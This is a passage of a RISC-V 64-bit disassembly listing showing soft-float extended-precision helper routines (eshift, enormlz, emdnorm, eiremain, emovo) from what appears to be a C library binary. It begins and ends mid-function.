   1360e:	3641                	addiw	a2,a2,-16
   13610:	fec5c5e3          	blt	a1,a2,135fa <eshift.part.0+0x24>
   13614:	88bd                	andi	s1,s1,15
   13616:	479d                	li	a5,7
   13618:	0297d463          	bge	a5,s1,13640 <eshift.part.0+0x6a>
   1361c:	01840713          	addi	a4,s0,24
   13620:	00240593          	addi	a1,s0,2
   13624:	4781                	li	a5,0
   13626:	00075683          	lhu	a3,0(a4)
   1362a:	1779                	addi	a4,a4,-2
   1362c:	00869613          	slli	a2,a3,0x8
   13630:	8fd1                	or	a5,a5,a2
   13632:	00f71123          	sh	a5,2(a4)
   13636:	0086d793          	srli	a5,a3,0x8
   1363a:	feb716e3          	bne	a4,a1,13626 <eshift.part.0+0x50>
   1363e:	34e1                	addiw	s1,s1,-8
   13640:	c491                	beqz	s1,1364c <eshift.part.0+0x76>
   13642:	34fd                	addiw	s1,s1,-1
   13644:	8522                	mv	a0,s0
   13646:	cc1ff0ef          	jal	ra,13306 <eshup1>
   1364a:	fce5                	bnez	s1,13642 <eshift.part.0+0x6c>
   1364c:	4501                	li	a0,0
   1364e:	70a2                	ld	ra,40(sp)
   13650:	7402                	ld	s0,32(sp)
   13652:	64e2                	ld	s1,24(sp)
   13654:	6942                	ld	s2,16(sp)
   13656:	69a2                	ld	s3,8(sp)
   13658:	6145                	addi	sp,sp,48
   1365a:	8082                	ret
   1365c:	57c5                	li	a5,-15
   1365e:	40b0093b          	negw	s2,a1
   13662:	0ef5d463          	bge	a1,a5,1374a <eshift.part.0+0x174>
   13666:	01850593          	addi	a1,a0,24
   1366a:	4981                	li	s3,0
   1366c:	00450693          	addi	a3,a0,4
   13670:	463d                	li	a2,15
   13672:	01845703          	lhu	a4,24(s0)
   13676:	87ae                	mv	a5,a1
   13678:	00e9e9b3          	or	s3,s3,a4
   1367c:	ffe7d703          	lhu	a4,-2(a5)
   13680:	17f9                	addi	a5,a5,-2
   13682:	00e79123          	sh	a4,2(a5)
   13686:	fed79be3          	bne	a5,a3,1367c <eshift.part.0+0xa6>
   1368a:	00041223          	sh	zero,4(s0)
   1368e:	3941                	addiw	s2,s2,-16
   13690:	ff2641e3          	blt	a2,s2,13672 <eshift.part.0+0x9c>
   13694:	57c1                	li	a5,-16
   13696:	5745                	li	a4,-15
   13698:	9f85                	subw	a5,a5,s1
   1369a:	4901                	li	s2,0
   1369c:	08e4c063          	blt	s1,a4,1371c <eshift.part.0+0x146>
   136a0:	00f9093b          	addw	s2,s2,a5
   136a4:	479d                	li	a5,7
   136a6:	0327df63          	bge	a5,s2,136e4 <eshift.part.0+0x10e>
   136aa:	0109999b          	slliw	s3,s3,0x10
   136ae:	4109d99b          	sraiw	s3,s3,0x10
   136b2:	01844783          	lbu	a5,24(s0)
   136b6:	01a40593          	addi	a1,s0,26
   136ba:	00f9e9b3          	or	s3,s3,a5
   136be:	19c2                	slli	s3,s3,0x30
   136c0:	0309d993          	srli	s3,s3,0x30
   136c4:	4781                	li	a5,0
   136c6:	0006d603          	lhu	a2,0(a3)
   136ca:	0689                	addi	a3,a3,2
   136cc:	0086571b          	srliw	a4,a2,0x8
   136d0:	8f5d                	or	a4,a4,a5
   136d2:	0086179b          	slliw	a5,a2,0x8
   136d6:	17c2                	slli	a5,a5,0x30
   136d8:	fee69f23          	sh	a4,-2(a3)
   136dc:	93c1                	srli	a5,a5,0x30
   136de:	feb694e3          	bne	a3,a1,136c6 <eshift.part.0+0xf0>
   136e2:	3961                	addiw	s2,s2,-8
   136e4:	04090b63          	beqz	s2,1373a <eshift.part.0+0x164>
   136e8:	01845783          	lhu	a5,24(s0)
   136ec:	397d                	addiw	s2,s2,-1
   136ee:	8522                	mv	a0,s0
   136f0:	8b85                	andi	a5,a5,1
   136f2:	0137e9b3          	or	s3,a5,s3
   136f6:	bc5ff0ef          	jal	ra,132ba <eshdn1>
   136fa:	fe0917e3          	bnez	s2,136e8 <eshift.part.0+0x112>
   136fe:	0109979b          	slliw	a5,s3,0x10
   13702:	4107d79b          	sraiw	a5,a5,0x10
   13706:	e78d                	bnez	a5,13730 <eshift.part.0+0x15a>
   13708:	03099513          	slli	a0,s3,0x30
   1370c:	9141                	srli	a0,a0,0x30
   1370e:	70a2                	ld	ra,40(sp)
   13710:	7402                	ld	s0,32(sp)
   13712:	64e2                	ld	s1,24(sp)
   13714:	6942                	ld	s2,16(sp)
   13716:	69a2                	ld	s3,8(sp)
   13718:	6145                	addi	sp,sp,48
   1371a:	8082                	ret
   1371c:	ff07f913          	andi	s2,a5,-16
   13720:	4120093b          	negw	s2,s2
   13724:	00f9093b          	addw	s2,s2,a5
   13728:	479d                	li	a5,7
   1372a:	fb27dde3          	bge	a5,s2,136e4 <eshift.part.0+0x10e>
   1372e:	bfb5                	j	136aa <eshift.part.0+0xd4>
   13730:	4985                	li	s3,1
   13732:	03099513          	slli	a0,s3,0x30
   13736:	9141                	srli	a0,a0,0x30
   13738:	bfd9                	j	1370e <eshift.part.0+0x138>
   1373a:	854e                	mv	a0,s3
   1373c:	00099563          	bnez	s3,13746 <eshift.part.0+0x170>
   13740:	1542                	slli	a0,a0,0x30
   13742:	9141                	srli	a0,a0,0x30
   13744:	b729                	j	1364e <eshift.part.0+0x78>
   13746:	4505                	li	a0,1
   13748:	bfe5                	j	13740 <eshift.part.0+0x16a>
   1374a:	57e5                	li	a5,-7
   1374c:	4981                	li	s3,0
   1374e:	f8f5dde3          	bge	a1,a5,136e8 <eshift.part.0+0x112>
   13752:	00440693          	addi	a3,s0,4
   13756:	bfb1                	j	136b2 <eshift.part.0+0xdc>

0000000000013758 <enormlz>:
   13758:	00455783          	lhu	a5,4(a0)
   1375c:	1101                	addi	sp,sp,-32
   1375e:	e426                	sd	s1,8(sp)
   13760:	ec06                	sd	ra,24(sp)
   13762:	e822                	sd	s0,16(sp)
   13764:	e04a                	sd	s2,0(sp)
   13766:	84aa                	mv	s1,a0
   13768:	ebc5                	bnez	a5,13818 <enormlz+0xc0>
   1376a:	00655703          	lhu	a4,6(a0)
   1376e:	4401                	li	s0,0
   13770:	0107179b          	slliw	a5,a4,0x10
   13774:	4107d79b          	sraiw	a5,a5,0x10
   13778:	02079693          	slli	a3,a5,0x20
   1377c:	0806c763          	bltz	a3,1380a <enormlz+0xb2>
   13780:	01a50693          	addi	a3,a0,26
   13784:	0a000613          	li	a2,160
   13788:	e31d                	bnez	a4,137ae <enormlz+0x56>
   1378a:	00648793          	addi	a5,s1,6
   1378e:	a019                	j	13794 <enormlz+0x3c>
   13790:	0007d703          	lhu	a4,0(a5)
   13794:	0789                	addi	a5,a5,2
   13796:	fee79e23          	sh	a4,-4(a5)
   1379a:	fef69be3          	bne	a3,a5,13790 <enormlz+0x38>
   1379e:	00049c23          	sh	zero,24(s1)
   137a2:	2441                	addiw	s0,s0,16
   137a4:	06c40363          	beq	s0,a2,1380a <enormlz+0xb2>
   137a8:	0064d703          	lhu	a4,6(s1)
   137ac:	df79                	beqz	a4,1378a <enormlz+0x32>
   137ae:	f0077793          	andi	a5,a4,-256
   137b2:	eb8d                	bnez	a5,137e4 <enormlz+0x8c>
   137b4:	01848513          	addi	a0,s1,24
   137b8:	00248593          	addi	a1,s1,2
   137bc:	4781                	li	a5,0
   137be:	872a                	mv	a4,a0
   137c0:	00075683          	lhu	a3,0(a4)
   137c4:	1779                	addi	a4,a4,-2
   137c6:	00869613          	slli	a2,a3,0x8
   137ca:	8fd1                	or	a5,a5,a2
   137cc:	00f71123          	sh	a5,2(a4)
   137d0:	0086d793          	srli	a5,a3,0x8
   137d4:	fee596e3          	bne	a1,a4,137c0 <enormlz+0x68>
   137d8:	0064d703          	lhu	a4,6(s1)
   137dc:	2421                	addiw	s0,s0,8
   137de:	f0077793          	andi	a5,a4,-256
   137e2:	dfe9                	beqz	a5,137bc <enormlz+0x64>
   137e4:	0a000913          	li	s2,160
   137e8:	a801                	j	137f8 <enormlz+0xa0>
   137ea:	2405                	addiw	s0,s0,1
   137ec:	b1bff0ef          	jal	ra,13306 <eshup1>
   137f0:	00894d63          	blt	s2,s0,1380a <enormlz+0xb2>
   137f4:	0064d703          	lhu	a4,6(s1)
   137f8:	0107171b          	slliw	a4,a4,0x10
   137fc:	4107571b          	sraiw	a4,a4,0x10
   13800:	02071793          	slli	a5,a4,0x20
   13804:	8526                	mv	a0,s1
   13806:	fe07d2e3          	bgez	a5,137ea <enormlz+0x92>
   1380a:	60e2                	ld	ra,24(sp)
   1380c:	8522                	mv	a0,s0
   1380e:	6442                	ld	s0,16(sp)
   13810:	64a2                	ld	s1,8(sp)
   13812:	6902                	ld	s2,0(sp)
   13814:	6105                	addi	sp,sp,32
   13816:	8082                	ret
   13818:	f007f713          	andi	a4,a5,-256
   1381c:	4401                	li	s0,0
   1381e:	e705                	bnez	a4,13846 <enormlz+0xee>
   13820:	f6f00913          	li	s2,-145
   13824:	a801                	j	13834 <enormlz+0xdc>
   13826:	347d                	addiw	s0,s0,-1
   13828:	a93ff0ef          	jal	ra,132ba <eshdn1>
   1382c:	fd240fe3          	beq	s0,s2,1380a <enormlz+0xb2>
   13830:	0044d783          	lhu	a5,4(s1)
   13834:	8526                	mv	a0,s1
   13836:	fbe5                	bnez	a5,13826 <enormlz+0xce>
   13838:	60e2                	ld	ra,24(sp)
   1383a:	8522                	mv	a0,s0
   1383c:	6442                	ld	s0,16(sp)
   1383e:	64a2                	ld	s1,8(sp)
   13840:	6902                	ld	s2,0(sp)
   13842:	6105                	addi	sp,sp,32
   13844:	8082                	ret
   13846:	00450693          	addi	a3,a0,4
   1384a:	01a50593          	addi	a1,a0,26
   1384e:	4701                	li	a4,0
   13850:	a019                	j	13856 <enormlz+0xfe>
   13852:	0006d783          	lhu	a5,0(a3)
   13856:	0087d61b          	srliw	a2,a5,0x8
   1385a:	8f51                	or	a4,a4,a2
   1385c:	0087979b          	slliw	a5,a5,0x8
   13860:	00e69023          	sh	a4,0(a3)
   13864:	03079713          	slli	a4,a5,0x30
   13868:	0689                	addi	a3,a3,2
   1386a:	9341                	srli	a4,a4,0x30
   1386c:	feb693e3          	bne	a3,a1,13852 <enormlz+0xfa>
   13870:	0044d783          	lhu	a5,4(s1)
   13874:	5461                	li	s0,-8
   13876:	b76d                	j	13820 <enormlz+0xc8>

0000000000013878 <emdnorm>:
   13878:	7139                	addi	sp,sp,-64
   1387a:	f822                	sd	s0,48(sp)
   1387c:	f426                	sd	s1,40(sp)
   1387e:	f04a                	sd	s2,32(sp)
   13880:	ec4e                	sd	s3,24(sp)
   13882:	e852                	sd	s4,16(sp)
   13884:	e456                	sd	s5,8(sp)
   13886:	8936                	mv	s2,a3
   13888:	84be                	mv	s1,a5
   1388a:	fc06                	sd	ra,56(sp)
   1388c:	842a                	mv	s0,a0
   1388e:	89ae                	mv	s3,a1
   13890:	8a32                	mv	s4,a2
   13892:	8aba                	mv	s5,a4
   13894:	ec5ff0ef          	jal	ra,13758 <enormlz>
   13898:	09000793          	li	a5,144
   1389c:	40a90933          	sub	s2,s2,a0
   138a0:	12a7db63          	bge	a5,a0,139d6 <emdnorm+0x15e>
   138a4:	67a1                	lui	a5,0x8
   138a6:	17f9                	addi	a5,a5,-2
   138a8:	1927dd63          	bge	a5,s2,13a42 <emdnorm+0x1ca>
   138ac:	160a8b63          	beqz	s5,13a22 <emdnorm+0x1aa>
   138b0:	40c8                	lw	a0,4(s1)
   138b2:	409c                	lw	a5,0(s1)
   138b4:	04a78e63          	beq	a5,a0,13910 <emdnorm+0x98>
   138b8:	01a48713          	addi	a4,s1,26
   138bc:	03448793          	addi	a5,s1,52
   138c0:	0709                	addi	a4,a4,2
   138c2:	fe071f23          	sh	zero,-2(a4)
   138c6:	fef71de3          	bne	a4,a5,138c0 <emdnorm+0x48>
   138ca:	03800793          	li	a5,56
   138ce:	28f50263          	beq	a0,a5,13b52 <emdnorm+0x2da>
   138d2:	12a7d163          	bge	a5,a0,139f4 <emdnorm+0x17c>
   138d6:	04000793          	li	a5,64
   138da:	24f50c63          	beq	a0,a5,13b32 <emdnorm+0x2ba>
   138de:	07100793          	li	a5,113
   138e2:	28f51163          	bne	a0,a5,13b64 <emdnorm+0x2ec>
   138e6:	47a9                	li	a5,10
   138e8:	40008737          	lui	a4,0x40008
   138ec:	177d                	addi	a4,a4,-1
   138ee:	1782                	slli	a5,a5,0x20
   138f0:	07a9                	addi	a5,a5,10
   138f2:	c8d8                	sw	a4,20(s1)
   138f4:	7761                	lui	a4,0xffff8
   138f6:	00e49c23          	sh	a4,24(s1)
   138fa:	e49c                	sd	a5,8(s1)
   138fc:	6721                	lui	a4,0x8
   138fe:	47a9                	li	a5,10
   13900:	07a1                	addi	a5,a5,8
   13902:	0786                	slli	a5,a5,0x1
   13904:	97a6                	add	a5,a5,s1
   13906:	00e79523          	sh	a4,10(a5) # 800a <register_fini-0x80a6>
   1390a:	c088                	sw	a0,0(s1)
   1390c:	17205163          	blez	s2,13a6e <emdnorm+0x1f6>
   13910:	4494                	lw	a3,8(s1)
   13912:	0144d603          	lhu	a2,20(s1)
   13916:	08f00793          	li	a5,143
   1391a:	00169713          	slli	a4,a3,0x1
   1391e:	00e40833          	add	a6,s0,a4
   13922:	00085883          	lhu	a7,0(a6) # ffffffffffff8000 <__BSS_END__+0xfffffffffffc0308>
   13926:	00c8f5b3          	and	a1,a7,a2
   1392a:	02a7ce63          	blt	a5,a0,13966 <emdnorm+0xee>
   1392e:	47ad                	li	a5,11
   13930:	02d7cb63          	blt	a5,a3,13966 <emdnorm+0xee>
   13934:	9f95                	subw	a5,a5,a3
   13936:	1782                	slli	a5,a5,0x20
   13938:	9381                	srli	a5,a5,0x20
   1393a:	97b6                	add	a5,a5,a3
   1393c:	00179693          	slli	a3,a5,0x1
   13940:	0709                	addi	a4,a4,2
   13942:	00440793          	addi	a5,s0,4
   13946:	9722                	add	a4,a4,s0
   13948:	97b6                	add	a5,a5,a3
   1394a:	00075683          	lhu	a3,0(a4) # 8000 <register_fini-0x80b0>
   1394e:	c299                	beqz	a3,13954 <emdnorm+0xdc>
   13950:	0015e593          	ori	a1,a1,1
   13954:	00071023          	sh	zero,0(a4)
   13958:	0709                	addi	a4,a4,2
   1395a:	fee798e3          	bne	a5,a4,1394a <emdnorm+0xd2>
   1395e:	00085883          	lhu	a7,0(a6)
   13962:	0144d603          	lhu	a2,20(s1)
   13966:	fff64613          	not	a2,a2
   1396a:	01167633          	and	a2,a2,a7
   1396e:	00c81023          	sh	a2,0(a6)
   13972:	0164d783          	lhu	a5,22(s1)
   13976:	00b7f733          	and	a4,a5,a1
   1397a:	cb05                	beqz	a4,139aa <emdnorm+0x132>
   1397c:	12b78f63          	beq	a5,a1,13aba <emdnorm+0x242>
   13980:	03248613          	addi	a2,s1,50
   13984:	01840693          	addi	a3,s0,24
   13988:	04f1                	addi	s1,s1,28
   1398a:	4701                	li	a4,0
   1398c:	00065783          	lhu	a5,0(a2)
   13990:	0006d583          	lhu	a1,0(a3)
   13994:	16f9                	addi	a3,a3,-2
   13996:	1679                	addi	a2,a2,-2
   13998:	97ae                	add	a5,a5,a1
   1399a:	97ba                	add	a5,a5,a4
   1399c:	0107d713          	srli	a4,a5,0x10
   139a0:	00f69123          	sh	a5,2(a3)
   139a4:	8b05                	andi	a4,a4,1
   139a6:	fe9613e3          	bne	a2,s1,1398c <emdnorm+0x114>
   139aa:	13205663          	blez	s2,13ad6 <emdnorm+0x25e>
   139ae:	00445783          	lhu	a5,4(s0)
   139b2:	e7ed                	bnez	a5,13a9c <emdnorm+0x224>
   139b4:	67a1                	lui	a5,0x8
   139b6:	00041c23          	sh	zero,24(s0)
   139ba:	17f9                	addi	a5,a5,-2
   139bc:	0727c563          	blt	a5,s2,13a26 <emdnorm+0x1ae>
   139c0:	01241123          	sh	s2,2(s0)
   139c4:	70e2                	ld	ra,56(sp)
   139c6:	7442                	ld	s0,48(sp)
   139c8:	74a2                	ld	s1,40(sp)
   139ca:	7902                	ld	s2,32(sp)
   139cc:	69e2                	ld	s3,24(sp)
   139ce:	6a42                	ld	s4,16(sp)
   139d0:	6aa2                	ld	s5,8(sp)
   139d2:	6121                	addi	sp,sp,64
   139d4:	8082                	ret
   139d6:	0a095a63          	bgez	s2,13a8a <emdnorm+0x212>
   139da:	f7000793          	li	a5,-144
   139de:	06f95b63          	bge	s2,a5,13a54 <emdnorm+0x1dc>
   139e2:	00240793          	addi	a5,s0,2
   139e6:	0469                	addi	s0,s0,26
   139e8:	0789                	addi	a5,a5,2
   139ea:	fe079f23          	sh	zero,-2(a5) # 7ffe <register_fini-0x80b2>
   139ee:	fe879de3          	bne	a5,s0,139e8 <emdnorm+0x170>
   139f2:	bfc9                	j	139c4 <emdnorm+0x14c>
   139f4:	47e1                	li	a5,24
   139f6:	10f50f63          	beq	a0,a5,13b14 <emdnorm+0x29c>
   139fa:	03500793          	li	a5,53
   139fe:	16f51363          	bne	a0,a5,13b64 <emdnorm+0x2ec>
   13a02:	040006b7          	lui	a3,0x4000
   13a06:	6705                	lui	a4,0x1
   13a08:	7ff68693          	addi	a3,a3,2047 # 40007ff <__BSS_END__+0x3fc8b07>
   13a0c:	4799                	li	a5,6
   13a0e:	80070713          	addi	a4,a4,-2048 # 800 <register_fini-0xf8b0>
   13a12:	c8d4                	sw	a3,20(s1)
   13a14:	1782                	slli	a5,a5,0x20
   13a16:	0799                	addi	a5,a5,6
   13a18:	e49c                	sd	a5,8(s1)
   13a1a:	00e49c23          	sh	a4,24(s1)
   13a1e:	4799                	li	a5,6
   13a20:	b5c5                	j	13900 <emdnorm+0x88>
   13a22:	00041c23          	sh	zero,24(s0)
   13a26:	77e1                	lui	a5,0xffff8
   13a28:	fff7c793          	not	a5,a5
   13a2c:	00f41123          	sh	a5,2(s0)
   13a30:	00440793          	addi	a5,s0,4
   13a34:	0461                	addi	s0,s0,24
   13a36:	00079023          	sh	zero,0(a5) # ffffffffffff8000 <__BSS_END__+0xfffffffffffc0308>
   13a3a:	0789                	addi	a5,a5,2
   13a3c:	fef41de3          	bne	s0,a5,13a36 <emdnorm+0x1be>
   13a40:	b751                	j	139c4 <emdnorm+0x14c>
   13a42:	00240793          	addi	a5,s0,2
   13a46:	0469                	addi	s0,s0,26
   13a48:	0789                	addi	a5,a5,2
   13a4a:	fe079f23          	sh	zero,-2(a5)
   13a4e:	fe879de3          	bne	a5,s0,13a48 <emdnorm+0x1d0>
   13a52:	bf8d                	j	139c4 <emdnorm+0x14c>
   13a54:	0009059b          	sext.w	a1,s2
   13a58:	8522                	mv	a0,s0
   13a5a:	b7dff0ef          	jal	ra,135d6 <eshift.part.0>
   13a5e:	c111                	beqz	a0,13a62 <emdnorm+0x1ea>
   13a60:	4985                	li	s3,1
   13a62:	0a0a8463          	beqz	s5,13b0a <emdnorm+0x292>
   13a66:	40c8                	lw	a0,4(s1)
   13a68:	409c                	lw	a5,0(s1)
   13a6a:	e4a797e3          	bne	a5,a0,138b8 <emdnorm+0x40>
   13a6e:	09000793          	li	a5,144
   13a72:	08f50163          	beq	a0,a5,13af4 <emdnorm+0x27c>
   13a76:	01845783          	lhu	a5,24(s0)
   13a7a:	8522                	mv	a0,s0
   13a7c:	8b85                	andi	a5,a5,1
   13a7e:	00f9e9b3          	or	s3,s3,a5
   13a82:	839ff0ef          	jal	ra,132ba <eshdn1>
   13a86:	40c8                	lw	a0,4(s1)
   13a88:	b561                	j	13910 <emdnorm+0x98>
   13a8a:	f20a85e3          	beqz	s5,139b4 <emdnorm+0x13c>
   13a8e:	40c8                	lw	a0,4(s1)
   13a90:	409c                	lw	a5,0(s1)
   13a92:	e2a793e3          	bne	a5,a0,138b8 <emdnorm+0x40>
   13a96:	e7204de3          	bgtz	s2,13910 <emdnorm+0x98>
   13a9a:	bfd1                	j	13a6e <emdnorm+0x1f6>
   13a9c:	8522                	mv	a0,s0
   13a9e:	81dff0ef          	jal	ra,132ba <eshdn1>
   13aa2:	67a1                	lui	a5,0x8
   13aa4:	0905                	addi	s2,s2,1
   13aa6:	00041c23          	sh	zero,24(s0)
   13aaa:	17f9                	addi	a5,a5,-2
   13aac:	f727cde3          	blt	a5,s2,13a26 <emdnorm+0x1ae>
   13ab0:	f00958e3          	bgez	s2,139c0 <emdnorm+0x148>
   13ab4:	00041123          	sh	zero,2(s0)
   13ab8:	b731                	j	139c4 <emdnorm+0x14c>
   13aba:	08099963          	bnez	s3,13b4c <emdnorm+0x2d4>
   13abe:	44dc                	lw	a5,12(s1)
   13ac0:	0184d703          	lhu	a4,24(s1)
   13ac4:	0786                	slli	a5,a5,0x1
   13ac6:	97a2                	add	a5,a5,s0
   13ac8:	0007d783          	lhu	a5,0(a5) # 8000 <register_fini-0x80b0>
   13acc:	8ff9                	and	a5,a5,a4
   13ace:	ea0799e3          	bnez	a5,13980 <emdnorm+0x108>
   13ad2:	ed204ee3          	bgtz	s2,139ae <emdnorm+0x136>
   13ad6:	09000793          	li	a5,144
   13ada:	00f50563          	beq	a0,a5,13ae4 <emdnorm+0x26c>
   13ade:	8522                	mv	a0,s0
   13ae0:	827ff0ef          	jal	ra,13306 <eshup1>
   13ae4:	00445783          	lhu	a5,4(s0)
   13ae8:	fbd5                	bnez	a5,13a9c <emdnorm+0x224>
   13aea:	00041c23          	sh	zero,24(s0)
   13aee:	fc0943e3          	bltz	s2,13ab4 <emdnorm+0x23c>
   13af2:	b5f9                	j	139c0 <emdnorm+0x148>
   13af4:	0084a803          	lw	a6,8(s1)
   13af8:	0144d603          	lhu	a2,20(s1)
   13afc:	0806                	slli	a6,a6,0x1
   13afe:	9822                	add	a6,a6,s0
   13b00:	00085883          	lhu	a7,0(a6)
   13b04:	011675b3          	and	a1,a2,a7
   13b08:	bdb9                	j	13966 <emdnorm+0xee>
   13b0a:	00041c23          	sh	zero,24(s0)
   13b0e:	00041123          	sh	zero,2(s0)
   13b12:	bd4d                	j	139c4 <emdnorm+0x14c>
   13b14:	4791                	li	a5,4
   13b16:	00800737          	lui	a4,0x800
   13b1a:	0ff70713          	addi	a4,a4,255 # 8000ff <__BSS_END__+0x7c8407>
   13b1e:	1782                	slli	a5,a5,0x20
   13b20:	0791                	addi	a5,a5,4
   13b22:	c8d8                	sw	a4,20(s1)
   13b24:	10000713          	li	a4,256
   13b28:	e49c                	sd	a5,8(s1)
   13b2a:	00e49c23          	sh	a4,24(s1)
   13b2e:	4791                	li	a5,4
   13b30:	bbc1                	j	13900 <emdnorm+0x88>
   13b32:	478d                	li	a5,3
   13b34:	80010737          	lui	a4,0x80010
   13b38:	177d                	addi	a4,a4,-1
   13b3a:	1786                	slli	a5,a5,0x21
   13b3c:	079d                	addi	a5,a5,7
   13b3e:	c8d8                	sw	a4,20(s1)
   13b40:	4705                	li	a4,1
   13b42:	e49c                	sd	a5,8(s1)
   13b44:	00e49c23          	sh	a4,24(s1)
   13b48:	4799                	li	a5,6
   13b4a:	bb5d                	j	13900 <emdnorm+0x88>
   13b4c:	e20a0ae3          	beqz	s4,13980 <emdnorm+0x108>
   13b50:	bda9                	j	139aa <emdnorm+0x132>
   13b52:	00800737          	lui	a4,0x800
   13b56:	0ff70713          	addi	a4,a4,255 # 8000ff <__BSS_END__+0x7c8407>
   13b5a:	c8d8                	sw	a4,20(s1)
   13b5c:	4799                	li	a5,6
   13b5e:	10000713          	li	a4,256
   13b62:	bd4d                	j	13a14 <emdnorm+0x19c>
   13b64:	47ad                	li	a5,11
   13b66:	80010737          	lui	a4,0x80010
   13b6a:	177d                	addi	a4,a4,-1
   13b6c:	1782                	slli	a5,a5,0x20
   13b6e:	07b1                	addi	a5,a5,12
   13b70:	c8d8                	sw	a4,20(s1)
   13b72:	4705                	li	a4,1
   13b74:	e49c                	sd	a5,8(s1)
   13b76:	00e49c23          	sh	a4,24(s1)
   13b7a:	47ad                	li	a5,11
   13b7c:	b351                	j	13900 <emdnorm+0x88>

0000000000013b7e <eiremain>:
   13b7e:	711d                	addi	sp,sp,-96
   13b80:	e4a6                	sd	s1,72(sp)
   13b82:	fc4e                	sd	s3,56(sp)
   13b84:	84ae                	mv	s1,a1
   13b86:	00255983          	lhu	s3,2(a0)
   13b8a:	ec86                	sd	ra,88(sp)
   13b8c:	e8a2                	sd	s0,80(sp)
   13b8e:	e0ca                	sd	s2,64(sp)
   13b90:	f852                	sd	s4,48(sp)
   13b92:	8932                	mv	s2,a2
   13b94:	f456                	sd	s5,40(sp)
   13b96:	f05a                	sd	s6,32(sp)
   13b98:	ec5e                	sd	s7,24(sp)
   13b9a:	e862                	sd	s8,16(sp)
   13b9c:	e466                	sd	s9,8(sp)
   13b9e:	e06a                	sd	s10,0(sp)
   13ba0:	8a2a                	mv	s4,a0
   13ba2:	bb7ff0ef          	jal	ra,13758 <enormlz>
   13ba6:	0024d403          	lhu	s0,2(s1)
   13baa:	87aa                	mv	a5,a0
   13bac:	8526                	mv	a0,s1
   13bae:	40f989b3          	sub	s3,s3,a5
   13bb2:	03490a93          	addi	s5,s2,52
   13bb6:	ba3ff0ef          	jal	ra,13758 <enormlz>
   13bba:	8c09                	sub	s0,s0,a0
   13bbc:	04e90713          	addi	a4,s2,78
   13bc0:	87d6                	mv	a5,s5
   13bc2:	0789                	addi	a5,a5,2
   13bc4:	fe079f23          	sh	zero,-2(a5)
   13bc8:	fee79de3          	bne	a5,a4,13bc2 <eiremain+0x44>
   13bcc:	07344b63          	blt	s0,s3,13c42 <eiremain+0xc4>
   13bd0:	004a0b93          	addi	s7,s4,4
   13bd4:	00448b13          	addi	s6,s1,4
   13bd8:	19fd                	addi	s3,s3,-1
   13bda:	01aa0c93          	addi	s9,s4,26
   13bde:	00248c13          	addi	s8,s1,2
   13be2:	875a                	mv	a4,s6
   13be4:	87de                	mv	a5,s7
   13be6:	0007d603          	lhu	a2,0(a5)
   13bea:	00075683          	lhu	a3,0(a4) # ffffffff80010000 <__BSS_END__+0xffffffff7ffd8308>
   13bee:	0789                	addi	a5,a5,2
   13bf0:	0709                	addi	a4,a4,2
   13bf2:	06d61c63          	bne	a2,a3,13c6a <eiremain+0xec>
   13bf6:	fefc98e3          	bne	s9,a5,13be6 <eiremain+0x68>
   13bfa:	018a0613          	addi	a2,s4,24
   13bfe:	01848713          	addi	a4,s1,24
   13c02:	4681                	li	a3,0
   13c04:	00075783          	lhu	a5,0(a4)
   13c08:	00065583          	lhu	a1,0(a2)
   13c0c:	1779                	addi	a4,a4,-2
   13c0e:	8f95                	sub	a5,a5,a3
   13c10:	8f8d                	sub	a5,a5,a1
   13c12:	0107d693          	srli	a3,a5,0x10
   13c16:	00f71123          	sh	a5,2(a4)
   13c1a:	8a85                	andi	a3,a3,1
   13c1c:	1679                	addi	a2,a2,-2
   13c1e:	feec13e3          	bne	s8,a4,13c04 <eiremain+0x86>
   13c22:	4d05                	li	s10,1
   13c24:	8556                	mv	a0,s5
   13c26:	ee0ff0ef          	jal	ra,13306 <eshup1>
   13c2a:	04c95783          	lhu	a5,76(s2)
   13c2e:	147d                	addi	s0,s0,-1
   13c30:	8526                	mv	a0,s1
   13c32:	00fd6d33          	or	s10,s10,a5
   13c36:	05a91623          	sh	s10,76(s2)
   13c3a:	eccff0ef          	jal	ra,13306 <eshup1>
   13c3e:	fb3412e3          	bne	s0,s3,13be2 <eiremain+0x64>
   13c42:	86a2                	mv	a3,s0
   13c44:	6446                	ld	s0,80(sp)
   13c46:	60e6                	ld	ra,88(sp)
   13c48:	79e2                	ld	s3,56(sp)
   13c4a:	7a42                	ld	s4,48(sp)
   13c4c:	7aa2                	ld	s5,40(sp)
   13c4e:	7b02                	ld	s6,32(sp)
   13c50:	6be2                	ld	s7,24(sp)
   13c52:	6c42                	ld	s8,16(sp)
   13c54:	6ca2                	ld	s9,8(sp)
   13c56:	6d02                	ld	s10,0(sp)
   13c58:	87ca                	mv	a5,s2
   13c5a:	8526                	mv	a0,s1
   13c5c:	6906                	ld	s2,64(sp)
   13c5e:	64a6                	ld	s1,72(sp)
   13c60:	4701                	li	a4,0
   13c62:	4601                	li	a2,0
   13c64:	4581                	li	a1,0
   13c66:	6125                	addi	sp,sp,96
   13c68:	b901                	j	13878 <emdnorm>
   13c6a:	4d01                	li	s10,0
   13c6c:	fac6ece3          	bltu	a3,a2,13c24 <eiremain+0xa6>
   13c70:	b769                	j	13bfa <eiremain+0x7c>

0000000000013c72 <emovo.isra.0>:
   13c72:	00055703          	lhu	a4,0(a0)
   13c76:	00255783          	lhu	a5,2(a0)
   13c7a:	c319                	beqz	a4,13c80 <emovo.isra.0+0xe>
   13c7c:	6721                	lui	a4,0x8
   13c7e:	8fd9                	or	a5,a5,a4
   13c80:	00f59923          	sh	a5,18(a1)
   13c84:	00255703          	lhu	a4,2(a0)
   13c88:	67a1                	lui	a5,0x8
   13c8a:	17fd                	addi	a5,a5,-1
   13c8c:	00f70f63          	beq	a4,a5,13caa <emovo.isra.0+0x38>
   13c90:	00650793          	addi	a5,a0,6
   13c94:	05c1                	addi	a1,a1,16
